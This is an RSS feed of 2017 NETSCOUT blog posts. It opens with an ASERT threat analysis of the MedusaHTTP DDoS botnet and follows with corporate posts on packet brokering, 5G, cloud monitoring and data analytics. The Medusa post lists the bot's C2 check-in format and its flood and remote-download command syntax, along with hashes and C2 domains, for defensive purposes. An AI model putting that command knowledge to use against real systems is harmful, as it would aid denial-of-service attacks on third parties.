<?xml version="1.0" encoding="utf-8"?>
<rss xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/" version="2.0" xml:base="http://localhost:7996/de">
  <channel>
    <title>NETSCOUT Blogs</title>
    <link>http://localhost:7996/de</link>
    <description/>
    <language>de</language>
    <atom:link rel="self" href="http://localhost:7996/de/full-blogs-2017.xml"/>
<lastBuildDate>Tue, 08 Nov 2022 01:05:15 -0500</lastBuildDate>
<pubDate>Mon, 18 Dec 2017 10:00:20 -0500</pubDate>

    <item>
  <title>MedusaHTTP DDoS Slithers Back into the Spotlight</title>
  <link>http://localhost:7996/blog/asert/medusahttp-ddos-slithers-back-spotlight</link>
  <description>Executive Summary MedusaHTTP is a HTTP-based DDoS botnet written in .NET, that surfaced in early 2017. MedusaHTTP is based off of MedusaIRC which leveraged IRC for its command and control communications instead of HTTP. MedusaIRC botnet has been advertised on various underground hacker marketplaces since 2015, while MedusaHTTP started appearing in 2017. The alleged seller of...</description>
  <content:encoded><![CDATA[<h2>Executive Summary</h2>

<p>MedusaHTTP is a HTTP-based DDoS botnet written in .NET, that surfaced in early 2017. MedusaHTTP is based off of MedusaIRC which leveraged IRC for its command and control communications instead of HTTP. MedusaIRC botnet has been advertised on various underground hacker marketplaces since 2015, while MedusaHTTP started appearing in 2017.</p>

<ul>
	<li>The alleged seller of MedusaIRC and MedusaHTTP, Stevenking(s) has advertised this botnet family on hacker marketplaces for many years.</li>
	<li>MedusaHTTP has evolved from an IRC botnet to an HTTP botnet. The HTTP components appear to be reused code from the leaked Diamond Fox DDoS botnet.</li>
	<li>MedusaHTTP was observed being distributed by the Rig Exploit Kit by an independent researcher.</li>
</ul>

<h2>Introduction</h2>

<p>MedusaHTTP was discovered after reading an independent researcher’s <a href="https://zerophagemalware.com/2017/10/13/rig-ek-via-malvertising-drops-a-miner/">blog post</a> describing malware distributed by recent Rig exploit kit campaigns. Screenshots of network traffic from one of the malware payloads within the post, caught our attention: <img src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/12/zphage_stopall.png" width="752" /> <img src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/12/zphage_httpstrong.png" /> The blog post initially identified the payload responsible for this traffic as AZORult; however, the commands in this traffic suggest DDoS functionality. AZORult is classified as an information stealing trojan which has the primary objective of capturing passwords, financial and personal information from the victim’s system. Samples of this family and campaign objectives are not known to contain DDoS functionality, so this could suggest a major update to the AZORult malware. ASERT obtained the sample linked in the blog post from <a href="https://www.virustotal.com/#/file/2919a13b964c8b006f144e3c8cc6563740d3d242f44822c8c44dc0db38137ccb/detection">VirusTotal</a>, and after analysis we believe this file is not AZORult but rather a new version of the DDoS bot known as Medusa. &nbsp;</p>

<h2>Enter Medusa – StevenKings’ DDoS botnet kit since 2015</h2>

<p>This isn’t the first time ASERT has encountered the Medusa botnet, we&nbsp; previously analyzed the IRC version of Medusa in 2016. In addition, we found references of Medusa being advertised on underground hacker marketplaces dating back to 2015. Advertisements were posted by a user under the name of StevenKings, a sample image of an advertisement is provided below:</p>

<p><img src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/12/medusapost_stevenkings.png" /></p>

<p>As insinuated above, Stevenkings may not be a native English speaker. We believe he or she may be a native Russian speaker based on the origin of their most active forum. In this 2015 advertisement, Stevenkings is selling the IRC version of Medusa for $500 in bitcoin, a cryptocurrency often leveraged in underground marketplaces. Reading further shows descriptions of future commands that will be added to the bot such as, “.httpstrong” which was the string that sparked our attention from the above researcher’s blog post. The advertisement also links to images of the botnet’s throughput, first showing screenshots to prove DDoS rates of 30k requests-per-second:</p>

<p><img src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/12/meduza2-1024x470.png" /></p>

<p>And then, a screenshot of it generating 3k requests-per-second with only 3 bots.</p>

<p><img src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/12/5eaa7540ee7b1dfc847be7895a016eebPanelScreen.png" /></p>

<p>Higher requests-per-second per bot allows a botnet controller to use less bots for taking down targets. This would mean the botnet controller could infect less victims while still remaining operationally successful.</p>

<h2>Medusa Now in HTTP</h2>

<p>Our research shows Stevenkings advertising the HTTP version of the Medusa botnet on underground hacker marketplaces in early 2017. The advertisements for this version included images of the HTTP command and control panel which appears to use the code and images from Diamond Fox, another well-known DDoS botnet. <img src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/12/panel_admin-1024x322.png" /> A view of the MedusaHTTP admin panel.</p>

<p><img src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/12/panel_attack-1024x257.png" /></p>

<p>A view of the MedusaHTTP attack page.</p>

<p><img src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/12/panel_diamond_fox_comparison.png" /></p>

<p>A view of the Diamond Fox admin panel for comparison.</p>

<p>Multiple versions of Diamond Fox botnet have been leaked over the past few years which would make the code reuse feasible for the Medusa malware author. All other portions of the code, except for the HTTP-based command and control communications, remain very similar to the IRC version of the Medusa botnet. &nbsp;</p>

<h2>Command and Control Communication</h2>

<p>The latest version of MedusaHTTP uses a HTTP-based command and control (C2) communication method as opposed the IRC communication of its predecessor. The initial connection uses a POST request with a static user agent of <strong>Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0</strong> sent to the C2. In the POST request payload, the victim bot will send introspection information using a xyz form item. The format of the introspection information payload follows this format:</p>

<blockquote><strong>xyz=08:00:27:??:??:??|&lt;OS Type&gt;|Version</strong></blockquote>

<p>an example of this would be: <img src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/12/medusa_c2_checkin.png" /></p>

<p>After the check-in command is sent, the C2 will either respond with a HTTP status code 200 as seen below:</p>

<p><img src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/12/medusa_c2_status200.png" /> or send back one of the following commands:</p>

<ul>
	<li>.icmp [host] [threads] [delay] [stoptime]</li>
	<li>.httpseebix [<a href="http://www.website.com">www.website.com</a>] [page.php] [threads] [delay] [stoptime]</li>
	<li>.httpoverload [<a href="http://www.website.com">www.website.com</a>] [page.php] [threads] [delay] [stoptime]</li>
	<li>.httpstrong [<a href="http://www.website.com">www.website.com</a>] [page.php] [threads] [delay] [stoptime]</li>
	<li>.httpactive [<a href="http://www.website.com">www.website.com</a>] [page.php] [threads] [delay] [stoptime]</li>
	<li>.httpssl [<a href="http://www.website.com">www.website.com</a>] [page.php] [threads] [delay] [true/false] [stoptime]</li>
	<li>.proxy [<a href="http://www.website.com">www.website.com</a>] [page.php] [webpagewithproxy] [threads] [delay] [stoptime]</li>
	<li>.httppost [<a href="http://www.website.com">www.website.com</a>] [page.php] [postcontent] [threads] [delay] [stoptime]</li>
	<li>.smartflood [GET] [<a href="http://www.website.com">www.website.com</a>] [page.php] [threads] [delay] [stoptime]</li>
	<li>.smartflood [POST] [<a href="http://www.website.com">www.website.com</a>] [page.php] [postcontent] [threads] [delay] [stoptime]</li>
	<li>.syn [host] [port] [sockets] [threads]</li>
	<li>.udp [host] [port] [sockets] [threads] [packetsize]</li>
	<li>.download [<a href="http://website.com/exe.exe">http://website.com/exe.exe</a>] [filename] [true/false]</li>
	<li>.stop-[methodname]</li>
	<li>.stop-all</li>
</ul>

<p>After which the bot will either wait and check-in again at a later time or act on the specific command received. &nbsp;</p>

<h2>Purported Capabilities</h2>

<p>Stevenkings claims MedusaHTTP is capable of the following:</p>

<ul>
	<li><strong>.httpssl</strong> is made for TLS and SSL websites. Using the TRUE option on httpssl will grab cookies.</li>
	<li><strong>.icmp</strong> is a layer 3 flood.</li>
	<li><strong>.httpseebix</strong> is ​​custom HTTP GET flood.</li>
	<li><strong>.httpstrong</strong> is a fast HTTP flood method.</li>
	<li><strong>.httpactive</strong> is a mix of TCP and layer 7.</li>
	<li><strong>.httpoverload</strong> can crash certain servers.</li>
	<li><strong>.httpproxy</strong> uses proxy servers to execute a DDoS.</li>
	<li><strong>.httppost</strong> is a POST flood.</li>
	<li><strong>.httpsmartflood</strong> bypasses all cookie protection unless its captcha.</li>
	<li><strong>.syn </strong>TCP flood which bypasses OVH.</li>
	<li><strong>.udp</strong> is basic UDP flood.</li>
</ul>

<p>&nbsp;</p>

<h2>Observed Command Traffic</h2>

<p>ASERT observed and was able to capture DDoS and command traffic from a portion of the purported attack types available to MedusaHTTP.</p>

<h3>.httpseebix</h3>

<p>This command sends GET requests using 1 of 12 user agents randomly chosen from a predefined list, similar to the below example: <img src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/12/pcap_mhttp_httpseebix.png" /></p>

<h3>.httpstrong</h3>

<p>This command appears to be similar to .httpseebix however this uses only one hardcoded user agent to perform http GET request.</p>

<h3>.httpoverload</h3>

<p>This command appears to be the same as .httpseebix; Stevenkings claims it has the ability to crash certain servers.</p>

<h3>.httpactive</h3>

<p>This command is advertised as a mixture of TCP and Layer 7 Flooding that has the ability to take down servers. Below you can see the utilization of multiple GET requests with a TCP packet of “0000000” in between them, illustrating this technique.</p>

<p><img src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/12/pcap_mhttp_httpactive.png" /></p>

<h3>.smartflood (GET)</h3>

<p>This command is purported to bypass cookie protection by StevenKings. The POST version of this command takes an additional parameter ‘Payload’ which, in this example, is ‘hello=hello’.</p>

<p><img src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/12/pcap_mhttp_smartflood_post-e1513284655938.png" /> There is also a GET version of this command which looks similar however does not include the POST data.</p>

<p><img src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/12/pcap_mhttp_smartflood_get.png" /></p>

<h3>.download</h3>

<p>This command instructs the bot to download and run executables, which could be a bot update or additional malicious files. The method of downloading the executables is a simple HTTP GET request.</p>

<h3>.stop-all</h3>

<p>This command instructs the bot to stop all active attacks. &nbsp;</p>

<h2>Conclusion</h2>

<p>MedusaHTTP has evolved from its prior IRC version. Although there is a new command and control communication mechanism, a large amount of functionality overlap remains. Many of the DDoS traffic examples above are exactly the same profile of traffic generated by MedusaIRC and continue to be mitigated in the same way using situationally appropriate firewall ACLs and other countermeasures available in Arbor products including HTTP Authentication, Zombie Detection, and AIF Malware Family Blocking. &nbsp;</p>

<h2>Indicators</h2>

<h3>Samples:</h3>

<ul>
	<li>2919a13b964c8b006f144e3c8cc6563740d3d242f44822c8c44dc0db38137ccb</li>
	<li>85ebf6330039de69dbef1a4860274f21d8b980adb9c3d8385873c5d697c61685</li>
	<li>e514935ab07b29ca1ee9eedaf699de202ada70e29b4fc4618908b8ca8b3f83ef</li>
	<li>290eb4666848172a03c9c5123c004278647e8f5445a7d4e9c29a9ecc58c1b329</li>
	<li>4654f4cbd9e3910f4901493b9774d978060f1c9a9489612b66d66ee61667f60f</li>
</ul>

<h3>Command and Control Domains:</h3>

<ul>
	<li>Disability[.]su</li>
	<li>Franchessko[.]top</li>
	<li>Ircnews[.]wang</li>
	<li>Kjnsfiosgjnlorgiko[.]ru</li>
	<li>Mhforum[.]biz</li>
	<li>Missyiurfound[.]bid</li>
	<li>scam-financial[.]org</li>
	<li>sgsdgsdger[.]ru</li>
	<li>troyamylove[.]gdn</li>
	<li>wooow1[.]ru</li>
	<li>youframegood[.]ru</li>
</ul>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/blog-category/asert">ASERT</category>
    <enclosure url="http://localhost:7996/sites/default/files/medusa.png" length="286157" type="image/png"/>
    <guid isPermaLink="false">cdb05d46-f417-47b2-bfb2-e00fa27ac9dd</guid>
    <pubDate>Mon, 18 Dec 2017 10:00:20 -0500</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>ASERT Team</dc:creator>
    </item>
<item>
  <title>Is ‘Virtual’ Packet Brokering Possible?</title>
  <link>http://localhost:7996/blog/virtual-packet-brokering-possible</link>
  <description>Achieving visibility of network traffic in the physical vs. virtual environments requires fundamentally different approaches. In the physical world, you have access to physical ports on switches and routers. As packets traverse the wire, you can tap the traffic as you desire—it’s easy to ‘capture’ traffic either at the point of origination or at destination with readily...</description>
  <content:encoded><![CDATA[<p>Achieving visibility of network traffic in the physical vs. virtual environments requires fundamentally different approaches. In the physical world, you have access to physical ports on switches and routers. As packets traverse the wire, you can tap the traffic as you desire&mdash;it&rsquo;s easy to &lsquo;capture&rsquo; traffic either at the point of origination or at destination with readily available <a href="https://www.netscout.com/product/enterprise/netscout-taps">physical taps</a> and condition them with <a href="https://www.netscout.com/product/packet-flow-switches-and-taps">packet flow switches</a>.</p>
<p>In the virtualized environments, you don&rsquo;t have this level of control. In fact, you mostly have chaos. There are three key challenges any packet brokering approach has to overcome. These are:</p>
<ul>
<li><strong>Lack of guaranteed delivery</strong>: Unlike with physical environments, packets are not easily captured in virtual and cloud environments. Their distribution is often on a best-effort basis, lacking predictability of physical packet flow switches that can guarantee zero packet loss, even at high utilization.</li>
<li><strong>Limited control of virtual resources</strong>: The processing and network resources are under the control of the virtual environment provider. Any virtual packet brokering function requires processing resources, while advanced capabilities, such as header stripping or de-duplication, will increase the processing requirements even further.</li>
</ul>
<ul>
<li><strong>Virtually infinite number of points of contact</strong>: Virtualization means that packets cannot be easily collected by capturing them at the aggregation point. There&rsquo;s no organized flow of traffic, so a typical brokering approach (physical &ldquo;capture-and-forward&rdquo;) would not work.</li>
</ul>
<p>How can we then enable packet brokering in the virtualized world? Since the problem is fundamentally different, it cannot be solved by traditional means. We need to capture the traffic at the first point of contact, in the acquisition layer, and then determine where it needs to be sent using virtualized means in a distribution layer. Lastly, the packets need to be received at a service layer where they are analyzed and optionally stored for later processing.</p>
<p>Since moving raw packets between virtual processes can be resource-intensive (read: expensive), being able to do some portion of the service layer analytics in the acquisition layer (and even the distribution layer) can greatly reduce the operational costs. The <a href="https://www.netscout.com/product/vscout-and-vstream">NETSCOUT vSCOUT agent</a> provides this capability, and, as an option, delivers the raw packets to distribution and service layers when advanced analytics are required.</p>
<p>This is just the beginning of the solution to the puzzle of virtualized visibility. Stay tuned for more in our future posts!</p>
<p>&nbsp;</p>]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/enterprise">Enterprise</category>
    <enclosure url="http://localhost:7996/sites/default/files/virtual%20packet.jpg" length="283973" type="image/jpeg"/>
    <guid isPermaLink="false">6698034e-0c23-4c75-8ad2-8f23aa16f69b</guid>
    <pubDate>Thu, 14 Dec 2017 12:57:04 -0500</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>Peter Vinsel</dc:creator>
    </item>
<item>
  <title>Carriers Can Transform Enterprise Infrastructure with 5G</title>
  <link>http://localhost:7996/blog/carriers-can-transform-enterprise-infrastructure-5g</link>
  <description>As enterprises look to equip their workers with rich new functionality, they are increasingly relying on networks to provide resilient low latency connectivity that supports the different requirements of a wide portfolio of enterprise applications. Starting from the relatively simple proposition of hosting data and apps in the cloud, it’s clear that enterprises now rely on...</description>
  <content:encoded><![CDATA[<p>As enterprises look to equip their workers with rich new functionality, they are increasingly relying on networks to provide resilient low latency connectivity that supports the different requirements of a wide portfolio of enterprise applications. Starting from the relatively simple proposition of hosting data and apps in the cloud, it’s clear that enterprises now rely on networks to provide ubiquitous, always-on connections to enterprise systems and applications. If those aren’t in place, the business can’t operate so the stakes are very high.</p>

<p>The focus there is on traditional connectivity, which is either available or unavailable at the capacity needed. However, as big video applications are increasingly adopted because of their ability to support high-definition collaboration technologies and better performing virtual desktop services for both fixed and mobile workforces, enterprises need more flexibility and the network to understand and dimension itself for the differing needs of the specific applications. As 5G comes to market, it can address many of the concerns enterprises have had in adopting these technologies for mobile workers.</p>

<p>Traditionally, mobility has meant relying on Wi-Fi or patchy 4G/LTE coverage and rich, bandwidth intensive-applications such as high-definition videoconferencing, have not been widely seen as enterprise-grade in the mobile world because of this.</p>

<p>5G can be a critical enabler of these services and enable true enterprise mobility because of the vastly greater bandwidth, lower latency and likely 100% coverage at 50Mbps it will provide. The experience available away from the fixed network will be, at last, at a similar level and that will sustain desktop apps for workers on the road.</p>

<p>In addition, user applications are becoming far more immersive experiences with applications such as augmented and virtual reality routinely being utilized. These necessitate ultra-high reliability and very low latency, along with traditional requirements of security and full coverage. The more dependent a business becomes on these technologies, the more reliant on the uptime of the network it becomes so carriers can play an increasingly important and more highly monetized role in supporting and providing enterprise applications with 5G.</p>

<p>Far from being just a dumb pipe, the carrier actually becomes a highly intelligent enabler of critical business infrastructure. This is particularly so with the increasingly popular software-defined WANs (SD-WANs) that enterprises are deploying because 5G has sufficient capacity and resilience to provide an additional diverse path to support SD-WAN, providing greater choice and coverage, particularly for remote sites. Support for services such as SD-WAN should be viewed separately from other enterprise traffic because the answer here isn’t to provide unlimited 5G bandwidth for every enterprise application to access. This will be both costly and wasteful as inefficiently managed connectivity will swamp even the 5G network with unoptimized traffic that hogs bandwidth and degrades user experiences while costing the enterprise a disproportionate amount. However, selecting 5G as an alternate path for SD-WAN traffic, which can be managed appropriately, is a viable option.</p>

<p>Traffic needs to be treated according to its requirements so the demand it places on the network is optimized. New approaches such as network slicing can aid this efficient utilization. For example, a network slice designed to support a multi-party high definition video-based collaborative working app can configure the network in such a way that the performance requirements of the app are met with minimized impact on the network, freeing up bandwidth for utilization by other slices.</p>

<p>In addition, new technologies such as virtual and augmented reality (AR) will increasingly be utilized to enhance&nbsp;enterprise&nbsp;productivity. Workers will use these technologies to aid them in performing their jobs and these may take the form of head-up displays presenting remote workers with information to assist them in the field. For example, AR glasses might present a circuit diagram to engineer repairing plant equipment in the field or present an interactive instructional video session. 5G will be critical infrastructure for this and many other enterprise applications, many of which are still under development.</p>

<p>This new wave of enterprise applications creates far more complexity in the network as the demand profile of service fragments. In this new landscape, carriers have a more extensive opportunity to apply their network monitoring – and other – capabilities to assure services and monetize 5G effectively. Enterprises will be happy to enable the monetization of 5G because the networks will be providing a new level of value to them that goes beyond simply providing connectivity. In fact, carriers will be the providers of a transformed enterprise infrastructure that, in turn, forms the foundations of enterprises’ own transformations as they servitize traditional products enabled by 5G-powered IoT apps and tools such as virtual and augmented reality, machine learning and artificial intelligence.</p>

<p>~<em>Written by&nbsp;George Malim. George&nbsp;is a freelance journalist who covers the telecoms and internet markets.</em></p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/service-provider">Service Provider</category>
    <enclosure url="http://localhost:7996/sites/default/files/2020-01/09/images/Zz1kMmUyYTYxZTU5NGQ5NzQzZDQ3NTFlNmE3M2ExMTMyMw.jpg" length="1007163" type="image/jpeg"/>
    <guid isPermaLink="false">ed08232e-ca03-44d6-8dfb-e5f3bf1e6908</guid>
    <pubDate>Wed, 06 Dec 2017 13:07:16 -0500</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>Putting the User Experience First</title>
  <link>http://localhost:7996/blog/putting-user-experience-first</link>
  <description>In the early days of IT, computing departments lived in ivory towers, dispensing reports to users when the mainframe felt like it. As enterprise technology evolved, user needs remained in the back seat, with application development cycles that trickled out new features on an IT department schedule that ranged from months to years. Cloud computing and continuous software...</description>
  <content:encoded><![CDATA[<p>In the early days of IT, computing departments lived in ivory towers,&nbsp;dispensing&nbsp;reports&nbsp;to users when the mainframe felt like it. As enterprise technology evolved, user&nbsp;needs remained&nbsp;in the back seat, with application development cycles that trickled out new features on an IT department schedule&nbsp;that&nbsp;ranged from&nbsp;months&nbsp;to&nbsp;years.</p>

<p>Cloud computing and continuous software development&nbsp;have changed things&nbsp;tremendously with a new, dynamic environment that gives more power to enterprise&nbsp;employees.&nbsp;They can now&nbsp;use a mixture of enterprise endpoints and mobile devices to access applications wherever they are,&nbsp;whenever&nbsp;they&nbsp;want. Those same users now expect IT to deliver&nbsp;the features that they want, when they need them. The user experience has&nbsp;finally taken&nbsp;center stage.</p>

<p>Hybrid cloud infrastructure has been a key&nbsp;element of this user-centric story. When employees access&nbsp;an application, it draws on a constellation of computing resources spread across multiple data centers, &nbsp;disparate locations,&nbsp;and even countries&nbsp;and continents. <span>It is the IT organization’s responsibility to marshal this&nbsp;array&nbsp;of&nbsp;on-premises and off-premises&nbsp;</span>components into a&nbsp;single, seamless user experience.</p>

<h2>Finding the needle in the technology haystack</h2>

<p>While this may give employees the same high-quality software experiences that they expect from hyperscale consumer services such as Facebook, Twitter, and Google's vast range of consumer-facing apps, it creates potential headaches for CIOs.</p>

<p>Unless IT administrators can&nbsp;pinpoint the source of performance problems, that seamless user experience suffers. Response times increase. Data glitches may occur. What was a single source of information and functionality at the user’s fingertips becomes an unreliable obstacle. What was once a joy to use becomes a burden.</p>

<p>The&nbsp;problem&nbsp;is,&nbsp;cloud&nbsp;environments&nbsp;differ&nbsp;from&nbsp;traditional&nbsp;monolithic&nbsp;infrastructures,&nbsp;which&nbsp;delivered&nbsp;single-server applications&nbsp;via a local area network. There, it was relatively easy to find the root cause of a performance&nbsp;problem.</p>

<p>Today,&nbsp;that&nbsp;simple technology stack has morphed into a&nbsp;cloud&nbsp;environment that&nbsp;forms the basis for&nbsp;an intricate, highly distributed technology haystack. A problem's cause is a needle, buried deep&nbsp;within.</p>

<p>Faced with such complexity, it's not surprising that many IT teams face challenges in finding those root causes. While cloud computing may provide a seamless user experience on the surface, the underlying infrastructure is often fragmented. Applications typically rely not on one cloud, but on many. Different business departments have built their own cloud computing infrastructures over time and only understand the technology resources within their own silo.</p>

<p>That can blind administrators to what's&nbsp;going&nbsp;on&nbsp;within&nbsp;their own IT environments because there is no single view of the entire architecture&nbsp;or&nbsp;service&nbsp;delivery&nbsp;path. When a performance or accuracy problem affects user experience, such&nbsp;blinkered or&nbsp;narrowly&nbsp;focused&nbsp;views of IT infrastructure make root-cause analysis difficult if not impossible.</p>

<p>This all endangers the user experience. Employees may find themselves at the mercy of unknown conditions that no one seems able to control. Productivity suffers, and support departments are unable to help.</p>

<p>As companies expand their multi-cloud architectures, drawing on a variety of on-premises and public cloud environments, the situation will only become more complex and opaque.</p>

<h2>A joined-up approach</h2>

<p>To quickly&nbsp;find&nbsp;problems and preserve the user experience, CIOs must embrace a new, joined-up approach to enterprise IT that begins by rethinking the metrics&nbsp;used to&nbsp;gauge and&nbsp;measure&nbsp;IT&nbsp;success.</p>

<p>The user experience is the new yardstick for IT success, underpinned by metrics such as application performance and the speed of new feature delivery. Modern CIOs will know that they are winning when users report that they can meet their business goals using these systems, or quickly update them with the features they need.</p>

<p>This holistic view of IT involves framing our view of it not through infrastructure silos, but from the perspective of business services and the complex web of dependencies between them. CIOs that view IT architectures in terms of business services can quickly understand how they affect each other. It will help them to prepare for new computing paradigms such as microservices, which atomize software resources still further and create even more complex connections between them.</p>

<p>This new view of computing requires technology platforms that can analyze underlying traffic flows between those services. By building up a data-centric view of service dependency, they can create a 360° view of these environments from the application layer all the way down to the network.</p>

<p>By using these tools, corporate IT departments can get a single, holistic view of their computing architecture – and ensure that they keep the user in the driver's seat.</p>

<p><em>~Written by&nbsp;Danny Bradbury. Danny is a technology journalist with over 20 years of experience writing about security, software development, and networking. He covers a mixture of business and consumer tech.</em></p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/enterprise">Enterprise</category>
    <enclosure url="http://localhost:7996/sites/default/files/2020-01/09/images/Zz1iODA2YTkyMGQyMmM0NTdjNDYyNTgxMmQ4ODMzMDI2Yw.jpg" length="670727" type="image/jpeg"/>
    <guid isPermaLink="false">7a564bec-b2c8-4246-a1fe-97a18cd20032</guid>
    <pubDate>Tue, 05 Dec 2017 17:25:26 -0500</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>Managing the Hybrid Cloud</title>
  <link>http://localhost:7996/blog/managing-hybrid-cloud</link>
  <description>Written by Russ Currie As VP of Enterprise Strategy, Russ is responsible for working with enterprise customers, partners and field personnel to ensure that NETSCOUT’s products and solutions are meeting the needs of our customers and the market. Russ has over 15 years working at NETSCOUT where he has held many technical and marketing roles. Prior to joining NETSCOUT, Russ had...</description>
  <content:encoded><![CDATA[<div style="background-color: #F5F5F5;margin: 20px 0 20px;padding: 20px;border: 1px solid #DDDDDD;"><img alt="Russ" data-entity-type="file" data-entity-uuid="b0f6d110-c325-4dfc-bca8-2ecb3da1dea2" src="http://localhost:7996/sites/default/files/inline-images/Russ-Currie%20Head%20Shot2.jpg" style="float:left;margin-right:15px;" /><strong><em>Written by Russ Currie</em></strong><br />
As VP of Enterprise Strategy, Russ is responsible for working with enterprise customers, partners and field personnel to ensure that NETSCOUT’s products and solutions are meeting the needs of our customers and the market. Russ has over 15 years working at NETSCOUT where he has held many technical and marketing roles. Prior to joining NETSCOUT, Russ had worked in IT managing networks for Fidelity Investments and Digital Equipment Corporation where he installed some of the first production Ethernet networks.</div>

<p>As tens of thousands of cloud developers lined the Las Vegas Strip last week at AWS re:Invent, NETSCOUT was there re-inventing itself. Big topics of conversation at AWS re:Invent were data, machine learning, and building new services. When I looked through the tweets and blog posts, there seemed to be so many announcements and so many partnerships discussed, it was spectacularly overwhelming.</p>

<p>Let’s focus the conversation on managing cloud environments. Those attending re:Invent 2017 are the innovators that are building our future digital businesses and relying on AI and data to make their visions a reality. In large part, these services are going to be increasingly complex and deployed in hybrid and multi-cloud environments. This requires that IT leaders invest in services assurance solutions to manage these new cloud-based services. NETSCOUT is focused on helping our customers “<a href="https://www.netscout.com/cloud-smarter">Cloud Smarter</a><a href="https://www.netscout.com/cloud-smarter-content2">.</a>”</p>

<p>As the velocity of the business increases, IT needs to keep pace. Business and developers are arming themselves with data and analytics. IT must do the same. But, IT needs some precision with their data and analytics. Rarely is IT afforded the luxury of time to analyze the data. If a service is “down” or performing poorly, IT must respond immediately and with precision.</p>

<p>NETSCOUT is focused on providing our customers with complete and consistent visibility throughout the hybrid and multi-cloud environment. Based on our ASI Smart Data, IT leaders can ensure that they are delivering high-quality services to their users and customers. At AWS re:Invent, Russ Currie, NETSCOUT’s VP of Enterprise Strategy, spoke about the cloud and managing hybrid cloud environments with John Wall and Keith Townsend of the CUBE. Listen to their conversation here:</p>
<!-- The script tag should live in the head of your page if at all possible --><script type="text/javascript" async="" src="https://play.vidyard.com/embed/v4.js"></script><!-- Put this wherever you would like your player to appear --><p><img alt="Russ Currie at AWS ReInvent 2017" class="vidyard-player-embed" data-type="lightbox" data-uuid="33bRRrY46LWudh13YYGzRG" data-v="4" src="https://play.vidyard.com/33bRRrY46LWudh13YYGzRG.jpg" /></p>

<p>If you want to learn how to Cloud Smarter, check out NETSCOUT’s <a href="https://www.netscout.com/solutions/cloud-monitoring">products</a>.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/enterprise">Enterprise</category>
    <enclosure url="http://localhost:7996/sites/default/files/AWSreInvent.jpg" length="142393" type="image/jpeg"/>
    <guid isPermaLink="false">4ced3e89-f891-4766-b364-07a739ddafd5</guid>
    <pubDate>Tue, 05 Dec 2017 13:01:34 -0500</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>Russ Currie</dc:creator>
    </item>
<item>
  <title>Data is the new oil, but the refinery process is hard work</title>
  <link>http://localhost:7996/blog/data-new-oil-refinery-process-hard-work</link>
  <description>There is no shortage of data available to Communications Service Providers. But the challenge is making that data accessible, usable, and actionable. Multiple, unstructured and structured, dissimilar data sets, constructing and correlating data, accessibility to data, and slow processing making real-time data impossible are just some of the problems facing Big Data Analytics...</description>
  <content:encoded><![CDATA[<p>There is no shortage of data available to Communications Service Providers. But the challenge is making that data accessible, usable, and actionable. Multiple, unstructured and structured, dissimilar data sets, constructing and correlating data, accessibility to data, and slow processing making real-time data impossible are just some of the problems facing Big Data Analytics (BDA). Sandra O’Boyle, Senior Analyst for CEM and Customer Analytics, from Heavy Reading captured the obstacles that continue to limit the success of Big Data Analytics in her article covering the recent Telco Data Analytics show in Madrid, “<strong><a href="http://www.lightreading.com/analytics/telco-data-analytics-europe-key-takeaways/a/d-id/738033" target="_blank">Data is the new oil, but the refinery process is hard work</a>.”&nbsp;</strong></p>

<p>&nbsp;<br />
“This is one of the top challenges for operators -- getting the right data in a usable format, ensuring that it's quality data. Again, organizational constraints are cited as a roadblock in terms of smoothing out this process and making it more efficient. Business users are not familiar with networks and IT systems, and there is a general lack of unified collaboration and governance. Complex integration of data in some cases is sucking up 80% of total project time, along with data validation, errors and quality problems. Huawei discussed the need to de-duplicate, cluster and consolidate data by automating data sources and dependencies and using human-guided machine learning algorithms to do automatic data mapping. Another key point is that subject matter experts/domain experts need to work very closely with data scientists on models, tracking the health of algorithms and confidence level in data quality and insights. In a panel on network analytics with Dell/EMC, NETSCOUT, and Nokia, the issue of laying the foundational tools and systems to ensure data and intelligence flows from the network efficiently came up as a key issue. Going forward, it will be critical to be able to do this on a real-time basis for on-demand NFV/SDN networks and services, where monitoring actual service quality will be a key requirement. A critical competitive differentiator for a data-driven operator will be figuring out how to get the right data from your network, as fast and efficiently as possible.”</p>

<p>Communications Service Providers need to start with a scalable, usable, and extensible data set as the proper foundation for their Big Data Analytics projects. “Smart data” based upon network traffic data that is imbued with user experience is arguably the best source of data for service assurance and business analytics. This real-time data supports proactive monitoring enabling Operations and Engineering to take early action to address service degradations before they impact a larger number of subscribers, as well as supporting subscriber and business insights. Smart data is key to moving from reactive to proactive and onto predictive and prescriptive.</p>

